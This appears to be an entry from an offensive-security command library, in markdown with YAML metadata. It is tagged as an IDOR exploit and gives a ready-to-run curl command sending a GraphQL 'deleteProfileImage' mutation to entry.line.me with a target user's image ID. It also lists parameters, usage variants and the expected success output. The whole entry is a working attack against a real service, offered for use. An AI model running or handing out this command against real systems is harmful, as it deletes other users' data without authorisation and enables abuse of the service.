---
id: cmd-graphql-delete-001
data: >-
  curl -X POST https://entry.line.me/graphql -H "Content-Type: application/json"
  -H "Authorization: Bearer YOUR_TOKEN" -d '{"query": "mutation {
  deleteProfileImage(imageId: \"TARGET_USER_IMAGE_ID\") { success message } }"}'
tags:
  - graphql
  - exploit
  - idor
type: command
output: JSON response with deletion status
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.099Z'
verified: false
validated: true
submitted: true
---
# graphql-delete-image

## Command

```bash
curl -X POST https://entry.line.me/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query": "mutation { deleteProfileImage(imageId: \"TARGET_USER_IMAGE_ID\") { success message } }"}'
```

## Description

This command sends a GraphQL mutation to delete a profile image using a specified image ID, exploiting IDOR if the ID is unauthorized.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method | Yes |
| `-H "Content-Type: application/json"` | JSON content type | Yes |
| `-H "Authorization: Bearer YOUR_TOKEN"` | Session authentication | Yes |
| `-d '{...}'` | Mutation payload with imageId | Yes |
| `imageId` | Target image identifier | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://entry.line.me/graphql -H "Content-Type: application/json" -H "Authorization: Bearer YOUR_TOKEN" -d '{"query": "mutation { deleteProfileImage(imageId: \"img_123456\") { success } }"}'
```

### Advanced Usage

With error handling and verbose output:

```bash
curl -v -X POST https://entry.line.me/graphql -H "Content-Type: application/json" -H "Authorization: Bearer YOUR_TOKEN" -d '{"query": "mutation { deleteProfileImage(imageId: \"TARGET_ID\") { success message errors } }"}'
```

## Expected Output

JSON response like {"data": {"deleteProfileImage": {"success": true, "message": "Image deleted successfully"}}}, or errors if authorization fails.

## Related

- [[commands/graphql-introspect]]
- [[procedures/Exploit-IDOR-to-Delete-Profile-Image]]
